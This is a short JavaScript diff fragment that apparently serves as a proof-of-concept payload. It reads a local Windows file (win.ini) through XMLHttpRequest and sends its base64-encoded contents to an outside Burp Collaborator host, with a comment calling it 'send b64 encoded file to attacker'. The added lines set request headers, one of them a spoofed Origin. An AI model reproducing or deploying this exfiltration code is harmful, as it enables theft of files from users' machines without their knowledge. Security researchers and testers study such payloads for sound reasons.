@@ -2,6 +2,8 @@
     var url = 'file:///C:/windows/win.ini'; //local file
 function load(url) {
         var xhr = new XMLHttpRequest();
+        xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+xhr.setRequestHeader("Origin", "johanrydbergmoller.github.io");
 xhr.onreadystatechange = function() {
             if (xhr.readyState === 4) {
             fetch('https://euc1u4sug8iycmh60bz77fiwqnwmkb.burpcollaborator.net/?exfiltrated=' + btoa(xhr.responseText)); //send b64 encoded file to attacker
